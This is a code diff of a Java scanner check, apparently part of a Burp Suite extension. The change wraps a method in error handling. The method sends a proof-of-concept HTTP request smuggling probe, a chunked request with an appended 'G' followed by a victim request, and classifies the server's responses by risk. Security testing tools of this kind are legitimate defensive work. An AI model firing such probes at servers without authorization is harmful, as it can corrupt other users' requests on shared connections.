@@ -58,32 +58,36 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
     }
 
     boolean sendPoc(byte[] base, IHttpService service) {
-        byte[] badMethodIfChunked = Utilities.setHeader(base, "Connection", "keep-alive");
-        badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, 1, 0));
-        SmuggleHelper helper = new SmuggleHelper(service);
-        helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked)+"G");
-        byte[] victim = makeChunked(base, 0, 0);
-        helper.queue(Utilities.helpers.bytesToString(victim));
+        try {
+            byte[] badMethodIfChunked = Utilities.setHeader(base, "Connection", "keep-alive");
+            badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, 1, 0));
+            SmuggleHelper helper = new SmuggleHelper(service);
+            helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked) + "G");
+            byte[] victim = makeChunked(base, 0, 0);
+            helper.queue(Utilities.helpers.bytesToString(victim));
 
-        List<Resp> results = helper.waitFor();
-        Resp cleanup = request(service, victim);
-        short cleanupStatus = cleanup.getInfo().getStatusCode();
-        short minerStatus = results.get(0).getInfo().getStatusCode();
-        short victimStatus = results.get(1).getInfo().getStatusCode();
+            List<Resp> results = helper.waitFor();
+            Resp cleanup = request(service, victim);
+            short cleanupStatus = cleanup.getInfo().getStatusCode();
+            short minerStatus = results.get(0).getInfo().getStatusCode();
+            short victimStatus = results.get(1).getInfo().getStatusCode();
 
-        if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
+            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
+                return false;
+            }
+
+            if (cleanupStatus == minerStatus) {
+                report("Req smuggling attack (legit)", "code1:code1:code2", cleanup, results.get(0), results.get(1));
+            } else if (minerStatus == victimStatus) {
+                report("Req smuggling attack (risky)", "code1:code2:code2", cleanup, results.get(0), results.get(1));
+            } else {
+                report("Req smuggling attack (hazardous)", "code1:code2:code3", cleanup, results.get(0), results.get(1));
+            }
+            return true;
+        }
+        catch (Exception e) {
             return false;
         }
-
-        if (cleanupStatus == minerStatus) {
-            report("Req smuggling attack (legit)", "code1:code1:code2", cleanup, results.get(0), results.get(1));
-        } else if (minerStatus == victimStatus) {
-            report("Req smuggling attack (risky)", "code1:code2:code2", cleanup, results.get(0), results.get(1));
-        }
-        else {
-            report("Req smuggling attack (hazardous)", "code1:code2:code3", cleanup, results.get(0), results.get(1));
-        }
-        return true;
     }
 
     byte[] bypassContentLengthFix(byte[] req) {
